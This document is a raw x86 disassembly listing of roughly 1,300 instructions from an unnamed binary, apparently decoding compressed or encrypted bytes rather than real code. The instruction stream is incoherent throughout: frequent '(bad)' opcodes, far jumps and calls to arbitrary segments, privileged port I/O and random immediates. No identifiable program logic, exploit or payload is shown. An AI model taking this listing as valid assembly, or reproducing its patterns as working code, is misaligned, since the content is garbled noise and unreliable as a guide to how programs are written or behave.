  408b3d:	or     ch,BYTE PTR [esi]
  408b3f:	std    
  408b40:	xchg   bl,cl
  408b42:	sahf   
  408b43:	push   ds
  408b44:	xor    eax,0x22c5c97f
  408b49:	cld    
  408b4a:	imul   eax,eax,0x87cf3281
  408b50:	outs   dx,BYTE PTR ds:[esi]
  408b51:	cmp    al,0x3
  408b53:	(bad)  
  408b54:	cmp    DWORD PTR [ebx-0x1db11a98],esi
  408b5a:	shl    DWORD PTR [esi-0x30],1
  408b5d:	jns    0x408b0a
  408b5f:	(bad)  
  408b60:	xchg   edi,eax
  408b61:	jbe    0x408b8f
  408b63:	push   cs
  408b64:	or     eax,DWORD PTR [eax-0x73]
  408b67:	inc    esi
  408b68:	cmp    al,0xac
  408b6a:	mov    al,0x72
  408b6c:	call   0x2dc2:0x8b1d50cc
  408b73:	sub    DWORD PTR [bp+si+0x6],ecx
  408b77:	outs   dx,BYTE PTR ds:[esi]
  408b78:	push   esp
  408b79:	shr    edx,0x87
  408b7c:	xchg   ecx,eax
  408b7d:	jmp    0xb725:0x12712800
  408b84:	int    0xd2
  408b86:	add    al,BYTE PTR [esi-0x59999856]
  408b8c:	push   bp
  408b8e:	xchg   esi,eax
  408b8f:	mov    eax,ecx
  408b91:	fdivr  QWORD PTR [eax]
  408b93:	clc    
  408b94:	aaa    
  408b95:	mov    edx,0x980e3d1c
  408b9a:	icebp  
  408b9b:	xchg   DWORD PTR [edi-0xba68a24],ebx
  408ba1:	and    BYTE PTR [ebp+0x42340b8c],0xd2
  408ba8:	mov    esp,0x7bee7aef
  408bad:	pop    ds
  408bae:	test   BYTE PTR [eax-0x779a85f1],ch
  408bb4:	mov    edi,0x6c23d871
  408bb9:	jp     0x408b6f
  408bbb:	mov    BYTE PTR [eax],ch
  408bbd:	iret   
  408bbe:	loope  0x408b45
  408bc0:	add    esp,DWORD PTR [esi]
  408bc2:	mov    ah,0x27
  408bc4:	(bad)  
  408bc5:	(bad)  
  408bc7:	mov    ecx,0x4b8b5627
  408bcc:	xchg   ecx,eax
  408bcd:	jne    0x408bee
  408bcf:	inc    ebx
  408bd0:	es aas 
  408bd2:	test   BYTE PTR [ebp+0x1],dl
  408bd5:	and    al,0x6
  408bd7:	call   FWORD PTR [edi-0x41]
  408bda:	in     al,0xc9
  408bdc:	popa   
  408bdd:	lock mov al,ds:0x3cde03c0
  408be3:	cmp    ecx,DWORD PTR [edi-0x60155225]
  408be9:	inc    ebx
  408bea:	dec    edi
  408beb:	fiadd  WORD PTR [edx]
  408bed:	and    eax,0x4eb35ddc
  408bf2:	outs   dx,DWORD PTR ds:[esi]
  408bf3:	mov    ah,0xd8
  408bf5:	or     esi,ebp
  408bf7:	jno    0x408bdb
  408bf9:	inc    eax
  408bfa:	sbb    al,0xa0
  408bfc:	xor    eax,ebx
  408bfe:	pushf  
  408bff:	cmp    dl,BYTE PTR [esi-0x702ac308]
  408c05:	test   DWORD PTR [edi-0xfa43ab3],eax
  408c0b:	xchg   BYTE PTR [edx],dh
  408c0d:	repnz popf 
  408c0f:	ficom  WORD PTR [edi+0x4e77e6bd]
  408c15:	and    edx,ebx
  408c17:	fs pop ebp
  408c19:	cmp    al,BYTE PTR [ebx]
  408c1b:	les    ebp,FWORD PTR [esi-0x626326be]
  408c21:	add    dl,al
  408c23:	lea    esp,[ebx+0x6cfa19fc]
  408c29:	xchg   esp,eax
  408c2a:	and    DWORD PTR [edx+ebp*4],eax
  408c2d:	call   0x9de87abc
  408c32:	aam    0x2c
  408c34:	ins    BYTE PTR es:[edi],dx
  408c35:	sub    eax,0x7b6deb2
  408c3a:	xchg   ebx,eax
  408c3b:	aad    0x83
  408c3d:	pushf  
  408c3e:	fsubr  QWORD PTR [ebx-0x42]
  408c41:	xor    BYTE PTR [esp+ebp*1+0x59],ch
  408c45:	mov    eax,ds:0x8d54520e
  408c4a:	out    0x50,eax
  408c4c:	pop    eax
  408c4d:	outs   dx,BYTE PTR ds:[esi]
  408c4e:	fs inc esp
  408c50:	pop    edi
  408c51:	mov    ds:0x27e6832,eax
  408c56:	test   DWORD PTR [edx],eax
  408c58:	xor    bl,ch
  408c5a:	fimul  WORD PTR [eax-0x62d0ccb9]
  408c60:	rcr    BYTE PTR [edx],cl
  408c62:	and    BYTE PTR [esp+eiz*4-0x6310044e],dh
  408c69:	stc    
  408c6a:	push   esp
  408c6b:	fs cmp eax,0xa9dddb03
  408c71:	icebp  
  408c72:	fisub  DWORD PTR [ecx]
  408c74:	and    eax,0x7885d4c0
  408c79:	popf   
  408c7a:	dec    ebx
  408c7b:	xor    DWORD PTR [ebp-0x7f0a513b],0xffffff93
  408c82:	js     0x408c04
  408c84:	sub    BYTE PTR [eax],ah
  408c86:	pop    edx
  408c87:	sbb    DWORD PTR [ebp+0x4633525e],esp
  408c8d:	jg     0x408c8e
  408c8f:	addr16 mov si,0xc264
  408c94:	add    ebx,0xffffff85
  408c97:	inc    esp
  408c98:	mov    WORD PTR [eax-0x5ce48ead],ds
  408c9e:	jbe    0x408c48
  408ca0:	push   esi
  408ca1:	fsub   DWORD PTR [eax-0x2a8b62ab]
  408ca7:	xchg   ebx,eax
  408ca8:	(bad)  
  408ca9:	nop
  408caa:	mov    ds:0x802e7827,al
  408caf:	jns    0x408c4b
  408cb1:	les    eax,FWORD PTR [edi+edx*4+0x1f]
  408cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cb6:	daa    
  408cb7:	leave  
  408cb8:	pop    esp
  408cb9:	out    dx,eax
  408cba:	popf   
  408cbb:	mov    edi,0x9efaa762
  408cc0:	pop    ss
  408cc1:	or     ecx,DWORD PTR [esi+eiz*1-0x51]
  408cc5:	mov    dh,0xa5
  408cc7:	(bad)  
  408cc8:	dec    esi
  408cc9:	mov    DWORD PTR [ecx-0x3f],0x400d2a67
  408cd0:	rol    DWORD PTR [esi],cl
  408cd2:	dec    esi
  408cd3:	mov    al,0xb9
  408cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cd6:	or     edx,DWORD PTR [eax]
  408cd8:	gs cmp al,0x47
  408cdb:	jne    0x408d22
  408cdd:	aad    0x2b
  408cdf:	or     al,0x9c
  408ce1:	xchg   ebx,eax
  408ce2:	dec    ebx
  408ce3:	fist   DWORD PTR [eax-0x5c]
  408ce6:	or     al,0x39
  408ce8:	sbb    eax,DWORD PTR [edi]
  408cea:	fisub  WORD PTR [ebp-0x9]
  408ced:	cmp    cl,cl
  408cef:	sub    DWORD PTR [edi-0x59],edi
  408cf2:	sub    eax,0x4c20be72
  408cf7:	mov    bh,0x89
  408cf9:	mov    ds:0x5c19870b,eax
  408cfe:	das    
  408cff:	(bad)  
  408d00:	hlt    
  408d01:	sub    ch,bh
  408d03:	ret    0x4a3
  408d06:	dec    edx
  408d07:	int3   
  408d08:	popf   
  408d09:	inc    esi
  408d0a:	mov    DWORD PTR [edx],0x116c6114
  408d10:	loop   0x408d7c
  408d12:	push   ebp
  408d13:	cwde   
  408d14:	and    edx,ebx
  408d16:	xchg   esi,eax
  408d17:	jecxz  0x408d22
  408d19:	cld    
  408d1a:	retf   
  408d1b:	pop    ebx
  408d1c:	mov    eax,DWORD PTR [ebx-0x7cf21f47]
  408d22:	out    dx,eax
  408d23:	cmp    cl,BYTE PTR [edi+0x7cd645c6]
  408d29:	push   ds
  408d2a:	rol    BYTE PTR [edx-0x33025f0e],cl
  408d30:	je     0x408d07
  408d32:	mov    ds:0x71a7ee05,al
  408d37:	adc    ah,cl
  408d39:	popa   
  408d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3c:	scas   eax,DWORD PTR es:[edi]
  408d3d:	adc    BYTE PTR [edi],0x6f
  408d40:	inc    esp
  408d41:	fsub   DWORD PTR [eax]
  408d43:	out    dx,al
  408d44:	mov    ebx,0xee3d856c
  408d49:	fwait
  408d4a:	mov    ebx,0x3094b2bb
  408d4f:	cmp    BYTE PTR [ecx-0x378d1a60],bh
  408d55:	jle    0x408d30
  408d57:	icebp  
  408d58:	and    esp,DWORD PTR [ebx]
  408d5a:	loope  0x408d28
  408d5c:	xor    eax,0xf42513c8
  408d61:	adc    eax,0xeab43410
  408d66:	clc    
  408d67:	aaa    
  408d68:	lods   al,BYTE PTR ds:[esi]
  408d69:	lahf   
  408d6a:	fldenv [edi]
  408d6c:	fld    DWORD PTR [edi+0x2c]
  408d6f:	iret   
  408d70:	pop    ecx
  408d71:	pop    esi
  408d72:	push   ss
  408d73:	adc    ah,bl
  408d75:	ret    
  408d76:	mov    bl,0xae
  408d78:	out    0xc4,al
  408d7a:	(bad)  
  408d7b:	call   0xabd3687d
  408d80:	shr    BYTE PTR [edi],1
  408d82:	adc    BYTE PTR [ebx+0x77],bl
  408d85:	(bad)  [esi+edi*1]
  408d88:	dec    eax
  408d89:	xchg   edi,eax
  408d8a:	rcr    ebp,0x13
  408d8d:	popa   
  408d8e:	xor    eax,0xd99c1462
  408d93:	mov    eax,ds:0xccd945fe
  408d98:	fld    DWORD PTR [eax]
  408d9a:	or     edx,ebp
  408d9c:	fdivr  st(0),st
  408d9e:	mov    WORD PTR [eax+0x10763212],ss
  408da4:	cmp    BYTE PTR [esi],0x14
  408da7:	sub    BYTE PTR [edi-0x7b248aa4],dl
  408dad:	inc    BYTE PTR [ecx]
  408daf:	xor    eax,0xd3228e1c
  408db4:	inc    edx
  408db5:	and    DWORD PTR [edi+0x56],ebp
  408db8:	mov    dl,0xcd
  408dba:	xor    DWORD PTR [esi+0xd],ecx
  408dbd:	jl     0x408e05
  408dbf:	sbb    eax,0xdc94a244
  408dc4:	cmova  ebp,DWORD PTR [edx+0x4b]
  408dc8:	mov    ds:0x99adb219,al
  408dcd:	(bad)  
  408dce:	aam    0x7a
  408dd0:	and    al,0xd1
  408dd2:	push   0x9ee8ac22
  408dd7:	and    BYTE PTR [edx],ah
  408dd9:	or     ecx,DWORD PTR [eax-0x76487884]
  408ddf:	ficom  WORD PTR [ebx-0x35]
  408de2:	xchg   edi,eax
  408de3:	ret    
  408de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de5:	ss pop edi
  408de7:	mov    dh,0xe
  408de9:	push   ds
  408dea:	xchg   BYTE PTR [eax],ah
  408dec:	push   esp
  408ded:	or     edi,DWORD PTR [edx]
  408def:	pop    ecx
  408df0:	add    dh,cl
  408df2:	cld    
  408df3:	in     al,dx
  408df4:	popf   
  408df5:	inc    ecx
  408df6:	imul   eax,DWORD PTR [ecx+0x3c483eb9],0x78579ac
  408e00:	sub    edi,DWORD PTR [eax+0x14]
  408e03:	(bad)  
  408e04:	xchg   esi,eax
  408e05:	mov    dl,0x85
  408e07:	pushf  
  408e08:	fwait
  408e09:	mov    al,ds:0xf08f775b
  408e0e:	iret   
  408e0f:	sbb    cl,ch
  408e11:	add    al,0x2e
  408e13:	into   
  408e14:	lea    eax,[ecx+0x649054fc]
  408e1a:	mov    esp,0xf284144c
  408e1f:	shl    ebp,1
  408e21:	jne    0x408e4c
  408e23:	pop    esp
  408e24:	call   0xe2d4:0x5eb24d5e
  408e2b:	jbe    0x408e91
  408e2d:	adc    dl,bl
  408e2f:	xchg   ebp,eax
  408e30:	push   ds
  408e31:	daa    
  408e32:	fadd   QWORD PTR [eax+0x65]
  408e35:	ret    0x17b2
  408e38:	retf   0x7510
  408e3b:	xchg   al,ch
  408e3d:	dec    DWORD PTR [edi+0x6f]
  408e40:	sub    esp,DWORD PTR [esi+0x0]
  408e43:	add    cl,BYTE PTR [eax+0x30]
  408e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e47:	stos   BYTE PTR es:[edi],al
  408e48:	adc    eax,0x7f7f97cd
  408e4d:	or     BYTE PTR [edx],dl
  408e4f:	sub    BYTE PTR [edx+0x1a9ad3ab],cl
  408e55:	xchg   ecx,eax
  408e56:	adc    eax,0x74a27340
  408e5b:	jl     0x408eda
  408e5d:	or     BYTE PTR [ecx+0x39086342],al
  408e63:	clc    
  408e64:	adc    dl,BYTE PTR [edx]
  408e66:	outs   dx,DWORD PTR ds:[esi]
  408e67:	retf   0x2480
  408e6a:	sub    BYTE PTR [edx],al
  408e6c:	in     al,dx
  408e6d:	cs mov ecx,0xf0b0f2e0
  408e73:	adc    eax,0x854e9d86
  408e78:	cmp    bh,BYTE PTR [esi-0x5]
  408e7b:	scas   al,BYTE PTR es:[edi]
  408e7c:	inc    edx
  408e7d:	cmp    DWORD PTR [eax-0x13],edx
  408e80:	mov    ds:0x24c9dd7b,al
  408e85:	mov    edi,0xa593a4e2
  408e8a:	daa    
  408e8b:	out    0xbd,eax
  408e8d:	bound  edi,QWORD PTR [esi+0x4af55a80]
  408e93:	dec    ebp
  408e94:	push   esp
  408e95:	sbb    cl,BYTE PTR [eax-0x58]
  408e98:	les    ebp,FWORD PTR [edx-0x26f7678]
  408e9e:	adc    DWORD PTR [esi],ecx
  408ea0:	xor    al,0x1a
  408ea2:	mov    ds:0xc3c8b7a,eax
  408ea7:	xchg   DWORD PTR [edi+0x1e],edx
  408eaa:	pop    ecx
  408eab:	add    ecx,edx
  408ead:	cs mov esp,0x943abbf5
  408eb3:	or     BYTE PTR [ecx-0x5d],dh
  408eb6:	mov    ecx,0x43277f3
  408ebb:	and    bl,BYTE PTR es:[ebp-0x61586f0c]
  408ec2:	add    edx,edx
  408ec4:	aad    0xe2
  408ec6:	fwait
  408ec7:	sbb    BYTE PTR [ecx],0xb7
  408eca:	sahf   
  408ecb:	scas   eax,DWORD PTR es:[edi]
  408ecc:	pop    edi
  408ecd:	jo     0x408e9b
  408ecf:	jge    0x408f10
  408ed1:	mov    ebx,0x2942226a
  408ed6:	sbb    al,0xc3
  408ed8:	fdivr  QWORD PTR [edi+eax*8-0x33a3e8c0]
  408edf:	mov    ah,0x2e
  408ee1:	cmp    DWORD PTR [esi+0xd],0x11
  408ee5:	(bad)  
  408ee6:	add    bh,0x9e
  408ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eea:	(bad)  
  408eeb:	(bad)  
  408eec:	arpl   WORD PTR [eax-0x5fadfc4c],di
  408ef2:	mov    esp,0xc935af41
  408ef7:	mov    ebx,0x65e27f18
  408efc:	ins    BYTE PTR es:[edi],dx
  408efd:	or     DWORD PTR [esi+0x67],edx
  408f00:	or     DWORD PTR [ebx-0x23],0x9e43d1a0
  408f07:	xchg   edi,eax
  408f08:	in     al,0x6b
  408f0a:	pop    edx
  408f0b:	outs   dx,DWORD PTR ds:[esi]
  408f0c:	mov    dh,0xa8
  408f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f0f:	pusha  
  408f10:	jmp    0x9197:0xa9033d8a
  408f17:	or     cl,BYTE PTR [ebx+0x6f413d25]
  408f1d:	add    al,0x23
  408f1f:	cmp    al,0x61
  408f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f22:	sub    edx,edi
  408f24:	mov    ?,WORD PTR [edx]
  408f26:	aaa    
  408f27:	sbb    ebx,DWORD PTR [ebp-0x56]
  408f2a:	clc    
  408f2b:	push   esi
  408f2c:	xchg   esp,eax
  408f2d:	or     DWORD PTR [ebx+0x50],eax
  408f30:	mov    ah,0x31
  408f32:	outs   dx,DWORD PTR ds:[esi]
  408f33:	mov    esi,0x743bd732
  408f38:	dec    esi
  408f39:	fild   QWORD PTR [eax-0x58a06dbe]
  408f3f:	and    bl,BYTE PTR [ebp-0x11]
  408f42:	daa    
  408f43:	inc    esp
  408f44:	mov    WORD PTR [eax],ss
  408f46:	mov    esp,0x8b64cd5a
  408f4b:	(bad)  
  408f4d:	das    
  408f4e:	pop    ss
  408f4f:	fidivr DWORD PTR [edi+0x257c0777]
  408f55:	sbb    DWORD PTR [edx+edx*2-0x35],esi
  408f59:	add    DWORD PTR [esp+ebx*8],ebx
  408f5c:	js     0x408f9a
  408f5e:	jns    0x408fbf
  408f60:	and    BYTE PTR [ebp-0x3ca1b754],bh
  408f66:	ret    
  408f67:	(bad)  
  408f68:	jns    0x408f73
  408f6a:	bound  edx,QWORD PTR [edx]
  408f6c:	sbb    eax,0x5cf910c2
  408f71:	add    BYTE PTR [eax],al
  408f73:	mov    bl,0xcd
  408f75:	ins    BYTE PTR es:[edi],dx
  408f76:	or     bl,al
  408f78:	lods   eax,DWORD PTR ds:[esi]
  408f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f7a:	adc    esp,DWORD PTR [ebp+0x4]
  408f7d:	(bad)  
  408f7e:	out    0x87,al
  408f80:	leave  
  408f81:	pop    esi
  408f82:	jns    0x408f36
  408f84:	imul   eax,DWORD PTR [ecx-0x32c955c5],0x60eef007
  408f8e:	mov    bl,0x99
  408f90:	jl     0x408f47
  408f92:	ins    BYTE PTR es:[edi],dx
  408f93:	adc    eax,DWORD PTR [ecx+0x26]
  408f96:	push   0xed3bbc57
  408f9b:	and    DWORD PTR [eax],ebp
  408f9d:	mov    ds:0x8c047e7b,al
  408fa2:	test   DWORD PTR [ecx+esi*2],eax
  408fa5:	ja     0x408f91
  408fa7:	cdq    
  408fa8:	mov    esi,0xfb75b0f9
  408fad:	aas    
  408fae:	stc    
  408faf:	push   ss
  408fb0:	repz sub al,0xe4
  408fb3:	nop
  408fb4:	scas   eax,DWORD PTR es:[edi]
  408fb5:	ds jmp 0x408fef
  408fb8:	stc    
  408fb9:	sbb    esp,DWORD PTR [edx-0x7e]
  408fbc:	daa    
  408fbd:	aad    0x9b
  408fbf:	and    esp,DWORD PTR [edi+edi*2]
  408fc2:	xor    al,0x7d
  408fc4:	rol    BYTE PTR [ebp+esi*4+0x56],0xd
  408fc9:	mov    al,0x93
  408fcb:	sbb    ebx,DWORD PTR [edi]
  408fcd:	fnsave [ebp+0x4db8665c]
  408fd3:	jbe    0x408fb7
  408fd5:	xor    dh,al
  408fd7:	mov    ecx,fs
  408fd9:	pop    edi
  408fda:	inc    esi
  408fdb:	test   eax,0xd24a8662
  408fe0:	test   BYTE PTR ds:0xf1ebb645,dl
  408fe6:	bound  esi,QWORD PTR [edx]
  408fe8:	push   ds
  408fe9:	stos   DWORD PTR es:[edi],eax
  408fea:	lods   al,BYTE PTR ds:[esi]
  408feb:	fcom   QWORD PTR [ecx]
  408fed:	lods   eax,DWORD PTR ds:[esi]
  408fee:	sub    ecx,ecx
  408ff0:	test   eax,0x7c3fffa3
  408ff5:	mov    ebp,0x4641a282
  408ffa:	sahf   
  408ffb:	push   edx
  408ffc:	sti    
  408ffd:	push   es
  408ffe:	xor    eax,0x95f7c7c
  409003:	xchg   edx,eax
  409004:	sub    al,0xc
  409006:	mov    ds,WORD PTR [edx]
  409008:	mov    ah,0x0
  40900a:	add    ah,BYTE PTR [ebp+0x2e401f42]
  409010:	inc    edi
  409011:	inc    edx
  409012:	jp     0x408ffd
  409014:	inc    esp
  409015:	sub    eax,edx
  409017:	mov    ds:0x1eab85f2,al
  40901c:	mov    bh,0x69
  40901e:	in     al,0xbd
  409020:	stos   DWORD PTR es:[edi],eax
  409021:	mov    dh,0x28
  409023:	loop   0x409065
  409025:	jns    0x4090a5
  409027:	mov    dl,0xeb
  409029:	jbe    0x408fad
  40902b:	in     eax,dx
  40902c:	sbb    bh,BYTE PTR [edx]
  40902e:	test   al,0xfd
  409030:	imul   ebx,DWORD PTR [ebx+0x27],0xffffffd7
  409034:	daa    
  409035:	sbb    al,0x66
  409037:	call   0xa304:0xdaeb876
  40903e:	mov    esp,0x54a32fd0
  409043:	dec    edx
  409044:	jp     0x408fdb
  409046:	sbb    ebp,esp
  409048:	pop    edi
  409049:	data16 sar BYTE PTR [edx],0xb1
  40904d:	dec    ebp
  40904e:	mov    edx,0x52243d7e
  409053:	mov    ecx,0xdc5e56fe
  409058:	xor    BYTE PTR [edi+0x70],ah
  40905b:	scas   eax,DWORD PTR es:[edi]
  40905c:	aam    0xf6
  40905e:	or     DWORD PTR [eax+0x55],ecx
  409061:	rcl    DWORD PTR [edi+0x65],0xab
  409065:	in     eax,dx
  409066:	ins    DWORD PTR es:[edi],dx
  409067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409068:	out    0xd8,eax
  40906a:	rol    cl,cl
  40906c:	out    0xa4,al
  40906e:	jno    0x4090ac
  409070:	mov    al,BYTE PTR [ebx]
  409072:	pop    es
  409073:	shl    bl,cl
  409075:	popf   
  409076:	xor    esp,DWORD PTR [esi+0xc4065bc]
  40907c:	jbe    0x4090e7
  40907e:	mov    bl,0x34
  409080:	ret    
  409081:	inc    edx
  409082:	xchg   edx,eax
  409083:	xchg   esi,eax
  409084:	lahf   
  409085:	test   al,0x5f
  409087:	outs   dx,DWORD PTR ds:[esi]
  409088:	test   BYTE PTR [eax],bh
  40908a:	aam    0x64
  40908c:	mov    ah,0x26
  40908e:	popf   
  40908f:	xchg   esp,eax
  409090:	prefetcht1 BYTE PTR [ecx*2+0x7178f429]
  409098:	xchg   ebp,eax
  409099:	push   edi
  40909a:	pushf  
  40909b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40909d:	xchg   BYTE PTR [ebx+0x58],dl
  4090a0:	mov    ebp,0xcf768e2e
  4090a5:	es dec ecx
  4090a7:	ret    
  4090a8:	pop    eax
  4090a9:	mov    ecx,DWORD PTR [ebx]
  4090ab:	push   esi
  4090ac:	inc    ecx
  4090ad:	das    
  4090ae:	mov    al,0xc0
  4090b0:	imul   esi
  4090b2:	fwait
  4090b3:	cs mov dl,0x5c
  4090b6:	in     eax,dx
  4090b7:	pop    ss
  4090b8:	and    dh,dh
  4090ba:	jg     0x409079
  4090bc:	adc    DWORD PTR [ecx-0x4b],esi
  4090bf:	mov    al,0x2
  4090c1:	aad    0x5c
  4090c3:	(bad)  
  4090c4:	out    dx,eax
  4090c5:	add    eax,edx
  4090c7:	sub    al,0x8a
  4090c9:	push   esp
  4090ca:	dec    esi
  4090cb:	ins    DWORD PTR es:[edi],dx
  4090cc:	cmp    BYTE PTR [ebp-0x4c],dl
  4090cf:	dec    ebp
  4090d0:	imul   BYTE PTR [esp+eax*8+0x2f68846b]
  4090d7:	test   DWORD PTR [ecx-0x20],esi
  4090da:	sub    al,0xbc
  4090dc:	cmc    
  4090dd:	cwde   
  4090de:	and    BYTE PTR [esi],dl
  4090e0:	sti    
  4090e1:	jecxz  0x409110
  4090e3:	jb     0x40910a
  4090e5:	push   esp
  4090e6:	dec    ecx
  4090e7:	repnz inc ebx
  4090e9:	xchg   edx,eax
  4090ea:	aas    
  4090eb:	push   edi
  4090ec:	cmp    BYTE PTR [edi+0x7f],dh
  4090ef:	jp     0x409113
  4090f1:	clc    
  4090f2:	shl    DWORD PTR [eax],cl
  4090f4:	ja     0x40909b
  4090f6:	in     al,dx
  4090f7:	inc    edx
  4090f8:	out    0xa0,al
  4090fa:	xchg   dl,cl
  4090fc:	icebp  
  4090fd:	daa    
  4090fe:	xchg   esp,eax
  4090ff:	int3   
  409100:	sahf   
  409101:	jmp    0x8098ec26
  409106:	mov    BYTE PTR [esi+0xf86c240],al
  40910c:	mov    dl,0xd6
  40910e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40910f:	mov    es,WORD PTR [edi-0x37]
  409112:	jo     0x4090af
  409114:	cld    
  409115:	outs   dx,BYTE PTR ds:[esi]
  409116:	leave  
  409117:	hlt    
  409118:	xchg   ecx,eax
  409119:	hlt    
  40911a:	out    0x5,eax
  40911c:	daa    
  40911d:	lods   eax,DWORD PTR ds:[esi]
  40911e:	(bad)
  409121:	inc    esp
  409122:	pop    ss
  409123:	ds mov eax,0x35f988dc
  409129:	add    esp,DWORD PTR [eax-0x7a494bae]
  40912f:	jecxz  0x40917d
  409131:	inc    edi
  409132:	outs   dx,BYTE PTR ds:[esi]
  409133:	(bad)  
  409135:	sub    DWORD PTR [ebx],ebx
  409137:	pop    eax
  409138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409139:	mov    al,ds:0x732a9baf
  40913e:	outs   dx,DWORD PTR ds:[esi]
  40913f:	and    DWORD PTR [ebp-0x1f],edi
  409142:	mov    ebp,0x636ee298
  409147:	add    edx,DWORD PTR [edi-0x1488eb1f]
  40914d:	or     al,0x4a
  40914f:	sub    eax,0x1eae6255
  409154:	sbb    edi,DWORD PTR [edx+0x126100d4]
  40915a:	mov    dh,0x55
  40915c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40915d:	mov    ch,0x52
  40915f:	sar    DWORD PTR [eax-0x1e],1
  409162:	mov    BYTE PTR [eax+ebx*1],bl
  409165:	fucomi st,st(2)
  409167:	in     al,dx
  409168:	push   esi
  409169:	inc    edx
  40916a:	mov    BYTE PTR [ebp+0x49],al
  40916d:	ss xchg ebp,eax
  40916f:	(bad)  
  409170:	pop    edi
  409171:	dec    ecx
  409172:	dec    ebx
  409173:	jmp    0x8da5:0x50636c16
  40917a:	test   dl,bl
  40917c:	cli    
  40917d:	adc    ah,BYTE PTR [ebx]
  40917f:	(bad)  
  409180:	fdiv   DWORD PTR [ebx]
  409182:	clc    
  409183:	xchg   esp,eax
  409184:	or     al,0xa2
  409186:	cs cmp al,0x43
  409189:	inc    eax
  40918a:	push   ebp
  40918b:	pop    ebp
  40918c:	retf   
  40918d:	adc    ah,BYTE PTR [ebx]
  40918f:	inc    eax
  409190:	push   cs
  409191:	test   BYTE PTR [ebp-0x4f],0xa7
  409195:	jmp    0xf65d:0xfdeb8dd6
  40919c:	xor    BYTE PTR [esp+ebp*2],al
  40919f:	cli    
  4091a0:	mov    DWORD PTR [esi],ebp
  4091a2:	jmp    0x76dcbf6e
  4091a7:	pop    esi
  4091a8:	in     al,dx
  4091a9:	push   eax
  4091aa:	retf   0xc799
  4091ad:	xor    al,0xa
  4091af:	adc    esp,DWORD PTR [ebx+edi*4]
  4091b2:	ffree  st(1)
  4091b4:	int    0xdc
  4091b6:	or     ebp,DWORD PTR [edx+0xa35d9c]
  4091bc:	loope  0x409143
  4091be:	leave  
  4091bf:	arpl   bp,bx
  4091c1:	outs   dx,BYTE PTR ds:[esi]
  4091c2:	gs cmp esp,0xc0de7649
  4091c9:	scas   eax,DWORD PTR es:[edi]
  4091ca:	cmp    al,0xe4
  4091cc:	sbb    BYTE PTR [eax+0x2fe3aa6e],ah
  4091d2:	inc    edx
  4091d3:	sub    al,0xd1
  4091d5:	loope  0x409254
  4091d7:	sub    al,BYTE PTR [ecx+edx*2-0x4d9eb7ba]
  4091de:	pop    es
  4091df:	hlt    
  4091e0:	push   edi
  4091e1:	inc    esi
  4091e2:	mov    ebp,0xccd3ae07
  4091e7:	mov    edx,0xbe46d6cc
  4091ec:	inc    edi
  4091ed:	cmp    ch,dl
  4091ef:	cmp    BYTE PTR [ebp+0x2e],0x97
  4091f3:	loope  0x40920c
  4091f5:	leave  
  4091f6:	jl     0x4091b6
  4091f8:	fild   QWORD PTR [ebp-0x57]
  4091fb:	fdivrp st(0),st
  4091fd:	sahf   
  4091fe:	push   0x90c3bfdf
  409203:	lahf   
  409204:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409206:	sbb    al,0x94
  409208:	jmp    0x5eb1:0xaf4bf066
  40920f:	lahf   
  409210:	jne    0x40925a
  409212:	aaa    
  409213:	stc    
  409214:	icebp  
  409215:	out    dx,eax
  409216:	mov    al,gs:0xfab7d861
  40921c:	lods   eax,DWORD PTR ds:[esi]
  40921d:	xchg   edi,eax
  40921e:	into   
  40921f:	daa    
  409220:	push   es
  409221:	rcl    ebx,cl
  409223:	stos   BYTE PTR es:[edi],al
  409224:	inc    edi
  409225:	xor    eax,0x2c0914de
  40922a:	and    DWORD PTR [ebx],0xc10c8ab2
  409230:	fwait
  409231:	inc    ecx
  409232:	dec    edx
  409233:	and    eax,0x791c89c9
  409238:	fldcw  WORD PTR [edx-0x2b]
  40923b:	hlt    
  40923c:	mov    edi,0x8e99ab4f
  409241:	test   al,0xbe
  409243:	mov    ah,0x6
  409245:	mov    ch,0xf2
  409247:	mov    bh,0x84
  409249:	inc    ecx
  40924a:	push   esi
  40924b:	call   0xdfb2475b
  409250:	xchg   ebx,eax
  409251:	push   ecx
  409252:	nop
  409253:	jb     0x409222
  409255:	imul   ebx,DWORD PTR [ebp+0x464e1d44],0x421a247d
  40925f:	aad    0xfa
  409261:	ins    BYTE PTR es:[edi],dx
  409262:	adc    ecx,DWORD PTR [ebx]
  409264:	push   0x265ee5bc
  409269:	fwait
  40926a:	adc    eax,0x9765f8ed
  40926f:	xchg   edx,eax
  409270:	mov    esp,0xcefa85bd
  409275:	mov    BYTE PTR [edx],0xe7
  409278:	cli    
  409279:	ret    
  40927a:	inc    esp
  40927b:	repnz mov ds:0x1cd34d72,al
  409281:	dec    ebx
  409282:	(bad)  
  409283:	cmc    
  409284:	sar    DWORD PTR [edi],1
  409286:	out    0xc5,al
  409288:	mov    dl,0x4c
  40928a:	cld    
  40928b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40928d:	xchg   edx,eax
  40928e:	xor    DWORD PTR [esp+eax*4-0x5d30af12],esp
  409295:	xchg   ecx,eax
  409296:	xchg   BYTE PTR [edi],cl
  409298:	mov    esi,0x33f09097
  40929d:	jg     0x409314
  40929f:	push   edi
  4092a0:	jmp    0x4092f6
  4092a2:	jle    0x4092ce
  4092a4:	jne    0x4092e2
  4092a6:	call   0xd9c2916f
  4092ab:	call   0x930a:0xa182bd5
  4092b2:	and    bh,cl
  4092b4:	fild   DWORD PTR [edx-0x1988c299]
  4092ba:	std    
  4092bb:	mov    bl,0x37
  4092be:	jp     0x4092a0
  4092c0:	out    dx,eax
  4092c1:	push   edx
